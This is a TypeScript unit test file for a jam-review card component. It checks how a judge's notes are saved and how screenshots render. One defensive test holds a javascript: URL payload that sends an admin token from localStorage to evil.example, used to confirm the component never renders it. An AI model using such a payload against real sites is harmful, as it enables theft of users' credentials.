import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import type { JamReviewEntry } from '../../lib/jam';
import { mount, type Mounted } from '../mount';
import { ReviewCard } from './ReviewTab';

type Scored = { app_id: string; category: string; score: number; note: string | null };

const APP_ID = '019e6701-13f8-71b5-ba04-85d326630e98';

let scored: Scored[] = [];
let held: Mounted | null = null;
const original = globalThis.fetch;

function entry(overrides: Partial<JamReviewEntry> = {}): JamReviewEntry {
  return {
    app_id: APP_ID,
    source_url: 'https://third.example/catalog.json',
    category: 'utility',
    video_url: 'https://youtu.be/abcdef',
    status: 'submitted',
    submitted_at: '2026-08-01T12:00:00.000Z',
    name: 'Thing',
    description: 'Does a thing.',
    author: 'somebody',
    icon: null,
    screenshot: null,
    repo: 'https://github.com/someone/thing',
    discord: 'somebody',
    wishlist: '',
    installs: 3,
    source_status: 'quarantined',
    scores: [{ category: 'utility', score: 4, note: null }],
    ...overrides,
  };
}

beforeEach(() => {
  scored = [];
  globalThis.fetch = (async (_input: string | URL | Request, init?: RequestInit) => {
    scored.push(JSON.parse(String(init?.body)) as Scored);
    return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
  }) as unknown as typeof fetch;
});

afterEach(() => {
  globalThis.fetch = original;
  held?.unmount();
  held = null;
});

describe('a judge editing a note', () => {
  test('clearing a note the judge just wrote sends the clear to the server', async () => {
    held = mount(<ReviewCard entry={entry()} token="judge-token" onError={() => undefined} />);

    await held.fill('input[aria-label="note for utility"]', 'great');
    await held.blur('input[aria-label="note for utility"]');
    await held.fill('input[aria-label="note for utility"]', '');
    await held.blur('input[aria-label="note for utility"]');

    expect(scored.map(call => call.note)).toEqual(['great', null]);
  });

  test('retyping the note the entry loaded with is sent again after it was cleared', async () => {
    held = mount(
      <ReviewCard
        entry={entry({ scores: [{ category: 'utility', score: 4, note: 'great' }] })}
        token="judge-token"
        onError={() => undefined}
      />,
    );

    await held.fill('input[aria-label="note for utility"]', '');
    await held.blur('input[aria-label="note for utility"]');
    await held.fill('input[aria-label="note for utility"]', 'great');
    await held.blur('input[aria-label="note for utility"]');

    expect(scored.map(call => call.note)).toEqual([null, 'great']);
  });

  test('a blur that changes nothing does not write', async () => {
    held = mount(<ReviewCard entry={entry()} token="judge-token" onError={() => undefined} />);

    await held.blur('input[aria-label="note for utility"]');

    expect(scored).toEqual([]);
  });
});

describe('the screenshot a judge scores against', () => {
  test('renders when the entry has one', () => {
    held = mount(
      <ReviewCard entry={entry({ screenshot: 'https://third.example/shot.png' })} token="t" onError={() => {}} />,
    );

    expect(held.all('img').map(image => image.getAttribute('src'))).toContain('https://third.example/shot.png');
  });

  test('a javascript url from a hostile catalog never reaches an image source', () => {
    const steal = "javascript:fetch('https://evil.example/'+localStorage.getItem('bridgething:admin-token'))";
    held = mount(<ReviewCard entry={entry({ screenshot: steal })} token="t" onError={() => {}} />);

    expect(held.all('img').map(image => image.getAttribute('src'))).not.toContain(steal);
  });
});
